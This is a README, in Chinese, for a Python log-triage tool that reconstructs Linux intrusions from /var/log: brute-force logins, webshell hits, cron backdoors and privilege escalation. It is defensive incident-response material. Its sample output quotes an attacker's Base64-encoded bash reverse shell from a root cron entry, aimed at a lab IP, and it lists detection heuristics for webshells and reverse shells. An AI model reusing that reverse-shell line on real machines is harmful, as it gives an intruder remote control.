# linux-log-analysis

一个**零依赖的 Linux 日志取证技能**：不装 ELK、不装 Splunk、不装任何第三方库，只用 Python 标准库，
把 `/var/log` 讲成「谁、什么时候、从哪进来、怎么拿到的 root、留下了什么后门」。

面向入侵排查 / 应急响应 / CTF 靶机取证 / 内网事件溯源。

## 它解决什么问题

拿到一台"疑似被黑"的机器，常见流程是：`grep Accepted auth.log`、`awk` 数一下 access.log 的来源 IP、
再翻 cron、再翻 mysql，来回跳十几个文件，中间还要处理 `.1` `.2.gz` 轮转、syslog 没有年份、
auth.log 和 syslog 重复记录、失败登录也返回 302 这些坑。查完一轮发现漏了东西，第二天重新来一遍。

这个技能把那一整套沉淀成一条命令，并固化成可被 AI 助手直接调用的 WorkBuddy Skill。

## 安装

### 作为 WorkBuddy 技能

```bash
git clone https://github.com/ggvchen/linux-log-analysis.git ~/.workbuddy/skills/linux-log-analysis
```

之后在会话里说「分析一下这台机器的日志」「看看是不是被入侵了」「攻击者 IP 是多少」即可自动触发。

### 只当命令行工具用

```bash
git clone https://github.com/ggvchen/linux-log-analysis.git
python linux-log-analysis/scripts/log_triage.py /var/log --year 2022 --tz 8
```

要求：Python 3.8+，无第三方依赖。

## 快速开始

```bash
# 1. 一次输出 9 类线索 + 统一时间线
python scripts/log_triage.py /var/log --year 2022 --tz 8

# 2. 从远程靶机/服务器取证（只读，不落地脚本）
/tmp/ir_task/r.sh 'cd / && tar czf /tmp/ev.tgz var/log var/www/html 2>/dev/null'
scp -P <PORT> root@<HOST>:/tmp/ev.tgz /tmp/ir_task/ && cd /tmp/ir_task && tar xzf ev.tgz

# 3. 对拉回的日志分诊
python scripts/log_triage.py /tmp/ir_task/var/log --year 2022
```

参数：

| 参数 | 作用 |
|---|---|
| `--year 2022` | 补齐 syslog / cron.log 缺失的年份（这两个文件只有 `Dec 14 02:10:05`，没有年） |
| `--tz 8` | 输出北京时间，默认 UTC。报告里给两个时区能避免阅读方误判 |

## 输出示例

对一台真实被入侵的 Ubuntu 18.04 靶机跑出来的结果（节选）：

```
【1】Web 访问来源 TOP
IP                     请求数  首次访问                末次访问                 状态码
192.168.226.24        1088  2022-12-14 01:52:39 2022-12-14 02:01:51  200:685,302:398,404:5
192.168.216.16         466  2022-12-14 00:44:58 2022-12-14 02:22:44  200:357,304:91,302:16,404:1

【2】口令爆破 / 暴力登录
  [Web]  192.168.226.24     登录接口 POST 1008 次  2022-12-14 01:52:49 ~ 2022-12-14 01:56:48  <<< 疑似暴力破解

【6】WebShell / 恶意脚本访问线索
  /data/themes/lndex.php
      来源 192.168.226.24   命中 4 次   状态码 404:4
      判定 常见木马命名/混淆命名
      备注 全部 404 —— 攻击者在试探路径，文件未落地
  /data/modules/lndex.php
      来源 192.168.226.24   命中 3 次   状态码 200:3
      判定 常见木马命名/混淆命名
      备注 存在 200 响应 —— 文件已落地并可访问，需立即上机确认

【5】计划任务变更与可疑执行
  --- 命中后门特征的 cron（按命令聚合）---
  [!!] Base64 编码管道执行（无文件落地）
       执行: 2022-10-29 01:02:46 ~ 2022-10-29 08:43:01（9 次）
       命令: root echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjI2LjI0LzIyNDk2IDA+JjEn|base64 -d|bash -i
```

注意第 6 节的处理方式：**同一个文件名出现 4 次全是 404（试探失败）、出现 3 次是 200（木马落地）**，
脚本会区分这两种情况并给出不同判定。只按文件名报警会把这个差别抹掉。

## 能查什么

| # | 线索类别 | 具体能力 |
|---|---|---|
| 1 | Web 来源画像 | 按 IP 聚合请求数、首末访问时间、状态码分布，一眼区分攻击者与运维 |
| 2 | 口令爆破 | 登录接口 POST 频次与时间窗口，自动排除 `installmodule` 之类的后台功能接口 |
| 3 | 登录成功 | SSH `Accepted`、`su`、`sudo` 记录；`su` 会标注**执行者 uid**（`by (uid=33)` = www-data） |
| 4 | 账户变更 / 提权 | `useradd`、`chpasswd`、pkexec 的 `GCONV_PATH` 指纹（CVE-2021-4034 PwnKit） |
| 5 | 计划任务后门 | crontab `REPLACE` 事件、Base64 管道执行、反弹 shell 特征，**按命令行聚合去重** |
| 6 | WebShell 线索 | 混淆命名（`lndex.php`、`1.php`）、`eval`/`base64_decode` 特征、200 与 404 分离判定 |
| 7 | 数据库访问 | MySQL `Connect` / `Access denied` 按连接 tid 配对，避免把失败连接读成登录成功 |
| 8 | 统一时间线 | 跨所有日志源合并排序，账户组操作自动降噪 |
| 9 | 日志完整性 | 跨年月检测（环境重置/时钟异常）、日志轮转与缺失提示 |

## 判据陷阱

`references/attack-patterns.md` 里整理了 9 个，下面是代价最高的五个：

1. **302 ≠ 登录成功。** 爆破期间失败也会跳转，一次事件里有 393 个 302 全是失败跳转。
   必须以"登录后的页面返回 200"判定，否则会把首次登录时间算早 3 分钟。
2. **mtime 可伪造，ctime 不行。** 木马 mtime 被改成前一天 08:35，但 `stat` 的 **Change** 是上传那一刻。
   落地时间一律看 ctime。
3. **运维 IP ≠ 攻击者。** 管理员也会高频访问后台、SSH 直登 root。区分依据是"有无爆破、有无上传可执行文件、
   有无提权/建号/改 cron"，而不是访问量大。
4. **用户级 crontab 多写一个 user 字段会让后门静默失效。** `* * * * * root echo ...` 在用户 crontab 里
   会让 `sh` 把 `root` 当命令名，报 not found，反弹 shell 永远连不上。
   证据是 cron 日志里的 `(No MTA installed, discarding output)` 和 `ss -antp` 无外连。
   **"存在后门"和"后门能用"是两回事**，处置优先级差很多。
5. **环境可能被重置过多次。** 多个 MySQL `started with:` 头部、反复出现的 `password changed for root`
   = 快照恢复。不锚定时间窗，会把上一轮的痕迹算到这一轮头上。

## 输出报告

`assets/report-template.html` 是可打印的 A4 报告模板，包含结论速览表、攻击者身份判定（含**被排除的正常 IP**）、
完整时间线、七问逐条取证（附原始日志行）、IOC、攻击链、处置建议、取证局限说明。

## 文件结构

```
SKILL.md                         主流程：三条铁律、五阶段工作流、常用命令
scripts/log_triage.py            日志快速分诊器（9 类线索 + 统一时间线）
references/log-sources.md        日志清单、字段含义、轮转、时区、日志被清除的识别
references/attack-patterns.md    各阶段手法指纹 + 9 个判据陷阱 + 七要素建模模板
assets/report-template.html      可打印取证报告模板
```

## 三条铁律

1. **先固定证据，再分析。** 日志拉回本地分析，远程只做只读操作，不在目标机上反复折腾。
2. **时间必须交叉印证。** 同一事件至少两个独立来源对得上（access.log 时间 + 文件 ctime + cron 记录）。
   单一来源只能标"疑似"。
3. **结论必须挂在原始日志行上。** 没有日志支撑的写"需上机确认"，不用推测填空。

## 说明

示例中的 IP（`192.168.226.24`、`192.168.216.16`）为 RFC1918 内网地址，来自演练靶机，非真实公网资产。
本仓库不含任何真实口令、密钥或密码哈希。

## License

MIT
